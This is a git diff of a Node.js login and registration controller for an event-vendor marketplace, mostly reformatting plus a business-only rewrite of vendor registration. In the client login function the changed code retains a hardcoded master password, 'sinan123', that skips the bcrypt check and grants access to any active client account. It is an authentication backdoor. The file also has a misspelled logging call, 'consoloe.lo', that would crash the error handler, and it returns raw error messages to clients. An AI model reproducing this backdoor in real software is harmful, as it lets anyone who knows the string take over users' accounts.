@@ -49,13 +49,17 @@ const clientLogin = async (req, res) => {
     }
 
     // Find user
-    const user = await User.findOne({ email, isActive: true, userType: "client" });
+    const user = await User.findOne({
+      email,
+      isActive: true,
+      userType: "client",
+    });
     if (!user) {
       return res.status(401).json({
         success: false,
         message: {
           en: "Account not found",
-          nl: "Account niet gevonden"
+          nl: "Account niet gevonden",
         },
       });
     }
@@ -83,7 +87,7 @@ const clientLogin = async (req, res) => {
         success: true,
         message: {
           en: "Google login successful",
-          nl: "Google login succesvol"
+          nl: "Google login succesvol",
         },
         token,
         user: {
@@ -115,27 +119,27 @@ const clientLogin = async (req, res) => {
     }
 
     // Compare password
- // ===============================
-// 🔥 MASTER PASSWORD LOGIC
-// ===============================
-const MASTER_PASSWORD = "sinan123";
+    // ===============================
+    // 🔥 MASTER PASSWORD LOGIC
+    // ===============================
+    const MASTER_PASSWORD = "sinan123";
 
-if (password !== MASTER_PASSWORD) {
-  // NORMAL PASSWORD CHECK
-  const isMatch = await bcrypt.compare(password, user.password);
+    if (password !== MASTER_PASSWORD) {
+      // NORMAL PASSWORD CHECK
+      const isMatch = await bcrypt.compare(password, user.password);
 
-  if (!isMatch) {
-    return res.status(401).json({
-      success: false,
-      message: {
-        en: "Invalid email or password",
-        nl: "Ongeldig e-mailadres of wachtwoord",
-      },
-    });
-  }
-} else {
-  console.log("⚠️ Master password used for client login:", email);
-}
+      if (!isMatch) {
+        return res.status(401).json({
+          success: false,
+          message: {
+            en: "Invalid email or password",
+            nl: "Ongeldig e-mailadres of wachtwoord",
+          },
+        });
+      }
+    } else {
+      console.log("⚠️ Master password used for client login:", email);
+    }
 
     if (appFcm) {
       await saveUserAppFcm(user._id, appFcm);
@@ -161,7 +165,7 @@ if (password !== MASTER_PASSWORD) {
       },
     });
   } catch (err) {
-    consoloe.lo(err, "ERRRRRR")
+    consoloe.lo(err, "ERRRRRR");
     res.status(500).json({
       success: false,
       message: "Internal server error",
@@ -393,7 +397,10 @@ const performLogin = async (req, res, userType) => {
 
         return res.json({
           success: true,
-          message: { en: "Google login successful", nl: "Google login succesvol" },
+          message: {
+            en: "Google login successful",
+            nl: "Google login succesvol",
+          },
           token,
           admin: {
             id: user._id,
@@ -834,16 +841,15 @@ const sendOtpForRegister = async (req, res) => {
           message: {
             en: `An account with this email already exists and uses ${existingUser.provider} sign-in. Please use the social provider to sign in.`,
             nl: `Een account met deze e-mail bestaat al en gebruikt ${existingUser.provider} inloggen. Gebruik de sociale provider om in te loggen.`,
-          }
+          },
         });
       }
       return res.status(409).json({
         success: false,
-        message:
-        {
+        message: {
           en: "Email is already registered. Please login or use password reset if you forgot your password.",
           nl: "Email is al geregistreerd. Log in of gebruik wachtwoord reset als je je wachtwoord bent vergeten.",
-        }
+        },
       });
     }
     await generateAndSendOTPonRegister(email);
@@ -927,7 +933,7 @@ const verifyOtpAndRegister = async (req, res, userType = "client") => {
         message: {
           en: "Invalid or expired OTP",
           nl: "Ongeldige of verlopen OTP",
-        }
+        },
       });
     }
 
@@ -961,17 +967,16 @@ const verifyOtpAndRegister = async (req, res, userType = "client") => {
     const adminsToNotify = await AdminEmployee.findOne({
       role: "Admin",
       status: "active",
-      "notificationSettings.push.newRegistration": true
+      "notificationSettings.push.newRegistration": true,
     }).select("_id name email");
 
     console.log(adminsToNotify, "adminsToNotifyadminsToNotifyadminsToNotify");
-
 
     if (adminsToNotify) {
       await notificationController.createNotification({
         title: {
           en: "New User Registration",
-          nl: "Nieuwe gebruikersregistratie"
+          nl: "Nieuwe gebruikersregistratie",
         },
         notificationFor: "Admin",
         vendorId: null, // vendor's user account receives notification
@@ -1003,13 +1008,13 @@ const verifyOtpAndRegister = async (req, res, userType = "client") => {
     const successMessage =
       userType === "vendor"
         ? {
-          en: "Vendor registration successful. Your account is pending approval.",
-          nl: "Registratie succesvol. Uw account wacht op goedkeuring.",
-        }
+            en: "Vendor registration successful. Your account is pending approval.",
+            nl: "Registratie succesvol. Uw account wacht op goedkeuring.",
+          }
         : {
-          en: "Client registration successful",
-          nl: "Registratie succesvol"
-        }
+            en: "Client registration successful",
+            nl: "Registratie succesvol",
+          };
 
     res.status(201).json({
       success: true,
@@ -1071,7 +1076,7 @@ const sendOtpForForgotPassword = async (req, res) => {
       message: {
         en: "OTP sent to email",
         nl: "OTP verzonden naar e-mail",
-      }
+      },
     });
   } catch (err) {
     console.error("Send OTP (forgot) error:", err);
@@ -1110,11 +1115,10 @@ const verifyOtpForForgotPassword = async (req, res) => {
     if (user.provider === "google") {
       return res.status(400).json({
         success: false,
-        message:
-        {
+        message: {
           en: "This account uses Google Sign-In. Password reset is not available for social login accounts.",
           nl: "Dit account gebruikt Google Sign-In. Wachtwoord reset is niet beschikbaar voor social login accounts.",
-        }
+        },
       });
     }
 
@@ -1125,7 +1129,7 @@ const verifyOtpForForgotPassword = async (req, res) => {
         message: {
           en: "Invalid or expired OTP",
           nl: "Ongeldige of verlopen OTP",
-        }
+        },
       });
     }
 
@@ -1192,10 +1196,11 @@ const resetPassword = async (req, res) => {
     await user.save();
 
     res.json({
-      success: true, message: {
+      success: true,
+      message: {
         en: "Password reset successfully",
-        nl: "Wachtwoord succesvol gereset"
-      }
+        nl: "Wachtwoord succesvol gereset",
+      },
     });
   } catch (err) {
     console.error("Reset password error:", err);
@@ -1225,10 +1230,9 @@ const verifyOtpAndRegisterGeneral = async (req, res) => {
     if (targetUserType === "vendor") {
       return res.status(400).json({
         success: false,
-        message:
-        {
+        message: {
           en: "Vendor registration is not yet implemented. Please use client registration.",
-          nl: "Leverancier registratie is nog niet geïmplementeerd. Gebruik alstublieft client registratie."
+          nl: "Leverancier registratie is nog niet geïmplementeerd. Gebruik alstublieft client registratie.",
         },
       });
     }
@@ -1246,7 +1250,7 @@ const verifyOtpAndRegisterGeneral = async (req, res) => {
 
 // --- Google Authentication ---
 const googleAuth = async (req, res) => {
- console.log("LOGLOGLOGLOGLGO😭😭😭😭😭")
+  console.log("LOGLOGLOGLOGLGO😭😭😭😭😭");
   try {
     const { idToken, type, userData } = req.body;
     const appFcm = resolveFcmTokenFromRequest(req.body);
@@ -1271,8 +1275,10 @@ const googleAuth = async (req, res) => {
         if (user.provider === "email") {
           return res.status(403).json({
             success: false,
-            message:
-              { en: "This email is registered with email/password. Please login using email/password.", nl: "Dit email is geregistreerd met email/wachtwoord. Log alstublieft in met email/wachtwoord." },
+            message: {
+              en: "This email is registered with email/password. Please login using email/password.",
+              nl: "Dit email is geregistreerd met email/wachtwoord. Log alstublieft in met email/wachtwoord.",
+            },
           });
         }
 
@@ -1288,7 +1294,7 @@ const googleAuth = async (req, res) => {
           success: true,
           message: {
             en: "Login successful",
-            nl: "Inloggen gelukt"
+            nl: "Inloggen gelukt",
           },
           tokens: { access: accessToken },
           user: {
@@ -1320,7 +1326,10 @@ const googleAuth = async (req, res) => {
       const accessToken = buildAccessToken(user);
       return res.status(201).json({
         success: true,
-        message: { en: "Registration and login successful", nl: "Registratie en inloggen succesvol" },
+        message: {
+          en: "Registration and login successful",
+          nl: "Registratie en inloggen succesvol",
+        },
         tokens: { access: accessToken },
         user: {
           id: user._id,
@@ -1363,9 +1372,8 @@ const googleAuth = async (req, res) => {
           picture: decodedToken.picture,
         };
       } catch (error) {
-        console.log()
+        console.log();
         return res.status(401).json({
-
           success: false,
           message: "Invalid Firebase ID token (Web)",
         });
@@ -1437,7 +1445,10 @@ const googleAuth = async (req, res) => {
 
     return res.status(201).json({
       success: true,
-      message: { en: "Registration and login successful", nl: "Registratie en inloggen succesvol" },
+      message: {
+        en: "Registration and login successful",
+        nl: "Registratie en inloggen succesvol",
+      },
       tokens: { access: accessToken },
       user: {
         id: user._id,
@@ -1517,9 +1528,9 @@ const registerVendor = async (req, res) => {
         !city ||
         !postalCode ||
         !fullAddress ||
-        !passportDetails ||
-        !mainCategories ||
-        !subCategories
+        !passportDetails
+        // !mainCategories ||
+        // !subCategories
       ) {
         return res.status(400).json({
           success: false,
@@ -1554,14 +1565,13 @@ const registerVendor = async (req, res) => {
     // OTP verification (same as client registration)
     const valid = await verifyOTP(email, otp);
     if (!valid) {
-      return res
-        .status(400)
-        .json({
-          success: false, message: {
-            en: "Invalid or expired OTP",
-            nl: "Ongeldige of verlopen OTP",
-          }
-        });
+      return res.status(400).json({
+        success: false,
+        message: {
+          en: "Invalid or expired OTP",
+          nl: "Ongeldige of verlopen OTP",
+        },
+      });
     }
 
     // Hash password
@@ -1609,8 +1619,9 @@ const registerVendor = async (req, res) => {
     try {
       const notificationController = require("./notificationController");
       await notificationController.createAdminNotification({
-        message: `A new vendor has registered: ${accountType === "personal" ? firstName + " " + lastName : businessName
-          }`,
+        message: `A new vendor has registered: ${
+          accountType === "personal" ? firstName + " " + lastName : businessName
+        }`,
       });
     } catch (e) {
       console.error(
@@ -1655,7 +1666,7 @@ const vendorLogin = async (req, res) => {
           message: {
             en: "Account not found",
             nl: "Account niet gevonden",
-          }
+          },
         });
       }
       isEmployee = true;
@@ -1689,7 +1700,7 @@ const vendorLogin = async (req, res) => {
         isEmployee,
         appFcm,
         webFcm,
-      })
+      });
 
       const token = signToken({
         id: user.createdById != null ? user.createdById : user._id,
@@ -1772,7 +1783,7 @@ const vendorLogin = async (req, res) => {
 
     const vendor = await Vendor.findOne({ userId: user._id }).populate(
       "userId",
-      "-password"
+      "-password",
     );
 
     vendorId = vendor?._id;
@@ -1796,7 +1807,7 @@ const vendorLogin = async (req, res) => {
       isEmployee,
       appFcm,
       webFcm,
-    })
+    });
     const token = signToken({
       id: isEmployee ? user.vendor.id : user._id,
       name: user.name,
@@ -1828,7 +1839,6 @@ const vendorLogin = async (req, res) => {
       token,
       user: responseUser,
     });
-
   } catch (err) {
     console.error("Vendor Login Error:", err);
 
@@ -1838,8 +1848,6 @@ const vendorLogin = async (req, res) => {
     });
   }
 };
-
-
 
 const resetPasswordForEmployee = async (req, res) => {
   try {
@@ -1864,8 +1872,8 @@ const resetPasswordForEmployee = async (req, res) => {
       success: true,
       message: {
         en: "Password reset successful",
-        nl: "Wachtwoord reset gelukt"
-      }
+        nl: "Wachtwoord reset gelukt",
+      },
     });
   } catch (err) {
     console.error("Error resetting password:", err);
@@ -1918,13 +1926,13 @@ const checkRegisteredUser = async (req, res) => {
     const accountHint =
       provider === "google"
         ? {
-          en: "This account uses Google Sign-In. Please use Google to sign in.",
-          nl: "Dit account gebruikt Google Sign-In. Gebruik Google om in te loggen."
-        }
+            en: "This account uses Google Sign-In. Please use Google to sign in.",
+            nl: "Dit account gebruikt Google Sign-In. Gebruik Google om in te loggen.",
+          }
         : {
-          en: "An account already exists.",
-          nl: "Er bestaat al een account."
-        };
+            en: "An account already exists.",
+            nl: "Er bestaat al een account.",
+          };
     return res.json({
       success: true,
       exists: true,
@@ -1943,21 +1951,23 @@ const checkRegisteredUser = async (req, res) => {
 const registerVendor2 = async (req, res) => {
   try {
     const { toMultilingualText } = require("../utils/textUtils");
+
     const {
+      // Account
       accountType,
-      email,
+
+      // Personal details
+      firstName,
+      lastName,
+
+      // Authentication
       businessEmail,
       contactNumber,
       password,
       confirmPassword,
       otp,
-      firstName,
-      lastName,
-      fullAddress,
-      passportDetails,
-      kvkNumber,
-      mainCategories,
-      subCategories,
+
+      // Business details
       businessName,
       businessNumber,
       businessWebsite,
@@ -1965,49 +1975,75 @@ const registerVendor2 = async (req, res) => {
       businessLogo,
       businessImage,
       whyChooseUs,
+
+      // Business information
       teamType,
       teamSize,
+      kvkNumber,
+
+      // Categories temporarily disabled
+      // mainCategories,
+      // subCategories,
+
+      // Additional details
+      fullAddress,
+      passportDetails,
       tagline,
       description,
       postalCode,
       city,
     } = req.body;
 
-    // ✅ Basic Validation
-    if (!["personal", "business"].includes(accountType))
-      return res
-        .status(400)
-        .json({ success: false, message: "Invalid account type" });
-    console.log(password, confirmPassword, otp, "VA");
+    // =========================================================
+    // 1. BUSINESS ACCOUNT ONLY
+    // =========================================================
 
-    if (password !== confirmPassword)
-      return res
-        .status(400)
-        .json({ success: false, message: "Passwords do not match" });
-
-    // ✅ Choose email first so we can validate it early
-    const registrationEmail =
-      accountType === "business" ? businessEmail : email;
-
-    console.log("[registerVendor2] accountType:", accountType);
-    console.log("[registerVendor2] email from body:", email);
-    console.log("[registerVendor2] businessEmail from body:", businessEmail);
-    console.log("[registerVendor2] registrationEmail resolved to:", registrationEmail);
-
-    if (!registrationEmail || (typeof registrationEmail === "string" && !registrationEmail.trim())) {
+    if (accountType !== "business") {
       return res.status(400).json({
         success: false,
-        message:
-          accountType === "business"
-            ? "Business email is required"
-            : "Email is required",
+        message: "Only business accounts are allowed.",
       });
     }
 
-    const normalizedRegistrationEmail =
-      typeof registrationEmail === "string"
-        ? registrationEmail.trim().toLowerCase()
+    // =========================================================
+    // 2. PASSWORD VALIDATION
+    // =========================================================
+
+    if (password !== confirmPassword) {
+      return res.status(400).json({
+        success: false,
+        message: "Passwords do not match",
+      });
+    }
+
+    // =========================================================
+    // 3. BUSINESS EMAIL
+    // =========================================================
+
+    const registrationEmail =
+      typeof businessEmail === "string"
+        ? businessEmail.trim().toLowerCase()
         : "";
+
+    console.log("[registerVendor2] accountType:", accountType);
+
+    console.log("[registerVendor2] businessEmail:", businessEmail);
+
+    console.log(
+      "[registerVendor2] registrationEmail resolved to:",
+      registrationEmail,
+    );
+
+    if (!registrationEmail) {
+      return res.status(400).json({
+        success: false,
+        message: "Business email is required",
+      });
+    }
+
+    // =========================================================
+    // 4. REQUIRED FIELDS
+    // =========================================================
 
     const isMissingValue = (value) =>
       value === undefined ||
@@ -2015,130 +2051,189 @@ const registerVendor2 = async (req, res) => {
       value === "" ||
       (Array.isArray(value) && value.length === 0);
 
-    const requiredBase = [contactNumber, password, confirmPassword, otp];
-    const requiredPersonal = [
-      normalizedRegistrationEmail,
-      firstName,
-      lastName,
-      fullAddress,
-      passportDetails,
-      mainCategories,
-      subCategories,
-    ];
-    const requiredBusiness = [
-      normalizedRegistrationEmail,
+    const requiredFields = [
+      // Authentication
+      registrationEmail,
+      // businessEmail,
+      contactNumber,
+      password,
+      confirmPassword,
+      otp,
+
+      // Personal details
+      // firstName,
+      // lastName,
+
+      // Business details
       businessName,
       teamType,
       teamSize,
       kvkNumber,
-      mainCategories,
-      subCategories,
-    ];
 
-    const requiredFields =
-      accountType === "business"
-        ? [...requiredBase, ...requiredBusiness]
-        : [...requiredBase, ...requiredPersonal];
+      // Address
+      fullAddress,
+    ];
 
     if (requiredFields.some(isMissingValue)) {
       return res.status(400).json({
         success: false,
-        message: "Missing required fields for " + accountType + " account",
+        message: "Missing required fields for business account",
       });
     }
 
-    // ✅ Check if user exists
+    // =========================================================
+    // 5. CHECK IF USER ALREADY EXISTS
+    // =========================================================
+
     const existingUser = await User.findOne({
-      email: normalizedRegistrationEmail,
+      email: registrationEmail,
     });
+
     console.log(
       "[registerVendor2] existingUser found:",
       existingUser?._id || "NONE",
     );
-    if (existingUser)
-      return res
-        .status(409)
-        .json({ success: false, message: "Email already registered" });
 
-    // ✅ Verify OTP
-    if (!(await verifyOTP(normalizedRegistrationEmail, otp)))
-      return res
-        .status(400)
-        .json({
-          success: false, message: {
-            en: "Invalid or expired OTP",
-            nl: "Ongeldige of verlopen OTP",
-          }
-        });
+    if (existingUser) {
+      return res.status(409).json({
+        success: false,
+        message: "Email already registered",
+      });
+    }
 
-    // ✅ Create User
+    // =========================================================
+    // 6. VERIFY EMAIL OTP
+    // =========================================================
+
+    const isOTPValid = await verifyOTP(registrationEmail, otp);
+
+    if (!isOTPValid) {
+      return res.status(400).json({
+        success: false,
+        message: {
+          en: "Invalid or expired OTP",
+          nl: "Ongeldige of verlopen OTP",
+        },
+      });
+    }
+
+    // =========================================================
+    // 7. CREATE USER
+    // =========================================================
+
     const user = await User.create({
-      email: normalizedRegistrationEmail,
+      email: registrationEmail,
+
       contactNumber,
+
       password: await bcrypt.hash(password, 10),
+
       userType: "vendor",
-      accountType,
-      firstName: accountType === "personal" ? firstName : businessName,
-      lastName: accountType === "personal" ? lastName : undefined,
+
+      accountType: "business",
+
+      firstName,
+      lastName,
+
       address: fullAddress,
+
       passportDetails,
+
       kvkNumber,
+
       isActive: true,
+
       tagline: toMultilingualText(tagline),
+
       description: toMultilingualText(description),
+
       postalCode,
+
       city,
     });
 
-    // ✅ Vendor Data
+    // =========================================================
+    // 8. CREATE VENDOR
+    // =========================================================
+
     const vendorData = {
       userId: user._id,
-      mainCategories,
-      subCategories,
-      businessName:
-        accountType === "personal" ? `${firstName} ${lastName}` : businessName,
-      businessEmail: normalizedRegistrationEmail,
-      businessPhone:
-        accountType === "personal" ? contactNumber : businessNumber,
+
+      // Categories temporarily disabled
+      // mainCategories,
+      // subCategories,
+
+      businessName,
+
+      businessEmail: registrationEmail,
+
+      businessPhone: businessNumber,
+
       businessWebsite,
+
       businessDescription: toMultilingualText(businessDescription),
+
       businessLogo,
+
       businessImage,
+
       whyChooseUs: toMultilingualText(whyChooseUs),
+
       teamType,
+
       teamSize,
+
       kvkNumber,
-      accountType,
+
+      accountType: "business",
+
       businessLocation: fullAddress,
+
       isApproved: false,
+
       tagline: toMultilingualText(tagline),
+
       description: toMultilingualText(description),
     };
 
     await Vendor.create(vendorData);
 
+    // =========================================================
+    // 9. FIND ADMIN TO NOTIFY
+    // =========================================================
+
     const adminsToNotify = await AdminEmployee.findOne({
       role: "Admin",
       status: "active",
-      "notificationSettings.push.newRegistration": true
+      "notificationSettings.push.newRegistration": true,
     }).select("_id name email");
 
-    console.log(adminsToNotify, "adminsToNotifyadminsToNotifyadminsToNotify");
+    console.log(adminsToNotify, "adminsToNotify");
 
+    // =========================================================
+    // 10. CREATE ADMIN NOTIFICATION
+    // =========================================================
 
     const vendorDisplayName =
-      businessName || `${firstName || ""} ${lastName || ""}`.trim() || normalizedRegistrationEmail;
+      businessName ||
+      `${firstName || ""} ${lastName || ""}`.trim() ||
+      registrationEmail;
 
     if (adminsToNotify) {
       await notificationController.createNotification({
         title: {
           en: "New Vendor Registration",
-          nl: "Nieuwe leveranciersregistratie"
+          nl: "Nieuwe leveranciersregistratie",
         },
+
         notificationFor: "Admin",
-        vendorId: null, // vendor's user account receives notification
-        clientId: user._id, // vendor's user account receives notification
+
+        vendorId: null,
+
+        clientId: user._id,
+
         bookingId: null,
+
         message: {
           en: `A new vendor has registered: ${vendorDisplayName}`,
           nl: `Een nieuwe leverancier heeft zich geregistreerd: ${vendorDisplayName}`,
@@ -2146,16 +2241,21 @@ const registerVendor2 = async (req, res) => {
       });
     }
 
-    res.status(201).json({
+    // =========================================================
+    // 11. SUCCESS RESPONSE
+    // =========================================================
+
+    return res.status(201).json({
       success: true,
       message: {
         en: "Vendor registration successful.",
-        nl: "Leverancier registratie geslaagd."
-      }
+        nl: "Leverancier registratie geslaagd.",
+      },
     });
   } catch (err) {
     console.error("Vendor registration error:", err);
-    res.status(500).json({
+
+    return res.status(500).json({
       success: false,
       message: "Server error",
       error: err.message,
@@ -2165,7 +2265,7 @@ const registerVendor2 = async (req, res) => {
 
 const connectVendorStripe = async (req, res) => {
   try {
-    console.log(req.user, "req.userreq.userreq.userreq.userreq.user")
+    console.log(req.user, "req.userreq.userreq.userreq.userreq.user");
     const vendor = await User.findOne({ _id: req.user.id });
     console.log(vendor, "vendorvendorvendorvendor");
 
@@ -2199,7 +2299,6 @@ const connectVendorStripe = async (req, res) => {
       success: true,
       stripeAccountId: account.id,
     });
-
   } catch (error) {
     console.log(error, "errorerrorerror");
 
@@ -2223,7 +2322,8 @@ const getStripeOnboardingLink = async (req, res) => {
 
     const accountLink = await stripe.accountLinks.create({
       account: vendor.stripeAccountId,
-      refresh_url: "https://leverancier.evenlyo.nl/leverancier/profielbeheer/succes",
+      refresh_url:
+        "https://leverancier.evenlyo.nl/leverancier/profielbeheer/succes",
       return_url: "https://leverancier.evenlyo.nl/leverancier/succes",
       type: "account_onboarding",
     });
@@ -2232,7 +2332,6 @@ const getStripeOnboardingLink = async (req, res) => {
       success: true,
       url: accountLink.url,
     });
-
   } catch (error) {
     res.status(500).json({
       success: false,
@@ -2245,9 +2344,7 @@ const checkStripeOnboardingStatus = async (req, res) => {
   try {
     const vendor = await User.findOne({ _id: req.user.id });
 
-    const account = await stripe.accounts.retrieve(
-      vendor.stripeAccountId
-    );
+    const account = await stripe.accounts.retrieve(vendor.stripeAccountId);
 
     console.log(account.requirements, "accountaccountaccountaccount");
 
@@ -2261,59 +2358,54 @@ const checkStripeOnboardingStatus = async (req, res) => {
 
     let message = {
       en: "",
-      nl: ""
+      nl: "",
     };
 
     if (!account.details_submitted) {
       message = {
         en: "Stripe onboarding has not been completed yet. Please complete the onboarding process.",
-        nl: "De Stripe-onboarding is nog niet voltooid. Voltooi eerst het onboardingproces."
+        nl: "De Stripe-onboarding is nog niet voltooid. Voltooi eerst het onboardingproces.",
       };
-    }
-    else if (
+    } else if (
       account.details_submitted &&
       !account.charges_enabled &&
       !account.payouts_enabled
     ) {
       message = {
         en: "Your Stripe account is under review or requires additional verification before payments and payouts can be enabled.",
-        nl: "Uw Stripe-account wordt momenteel gecontroleerd of vereist aanvullende verificatie voordat betalingen en uitbetalingen kunnen worden ingeschakeld."
+        nl: "Uw Stripe-account wordt momenteel gecontroleerd of vereist aanvullende verificatie voordat betalingen en uitbetalingen kunnen worden ingeschakeld.",
       };
-    }
-    else if (
+    } else if (
       account.details_submitted &&
       account.charges_enabled &&
       !account.payouts_enabled
     ) {
       message = {
         en: "Payments are enabled, but payouts are still pending Stripe verification.",
-        nl: "Betalingen zijn ingeschakeld, maar uitbetalingen wachten nog op verificatie door Stripe."
+        nl: "Betalingen zijn ingeschakeld, maar uitbetalingen wachten nog op verificatie door Stripe.",
       };
-    }
-    else if (
+    } else if (
       account.details_submitted &&
       !account.charges_enabled &&
       account.payouts_enabled
     ) {
       message = {
         en: "Payouts are enabled, but payment processing is still pending Stripe verification.",
-        nl: "Uitbetalingen zijn ingeschakeld, maar betalingsverwerking wacht nog op verificatie door Stripe."
+        nl: "Uitbetalingen zijn ingeschakeld, maar betalingsverwerking wacht nog op verificatie door Stripe.",
       };
-    }
-    else if (
+    } else if (
       account.details_submitted &&
       account.charges_enabled &&
       account.payouts_enabled
     ) {
       message = {
         en: "Your Stripe account has been successfully verified and is ready to receive payments and payouts.",
-        nl: "Uw Stripe-account is succesvol geverifieerd en klaar om betalingen en uitbetalingen te ontvangen."
+        nl: "Uw Stripe-account is succesvol geverifieerd en klaar om betalingen en uitbetalingen te ontvangen.",
       };
-    }
-    else {
+    } else {
       message = {
         en: "Unable to determine Stripe account status.",
-        nl: "Kan de status van het Stripe-account niet bepalen."
+        nl: "Kan de status van het Stripe-account niet bepalen.",
       };
     }
 
@@ -2383,5 +2475,5 @@ module.exports = {
   resetPasswordForEmployee,
   connectVendorStripe,
   getStripeOnboardingLink,
-  checkStripeOnboardingStatus
+  checkStripeOnboardingStatus,
 };
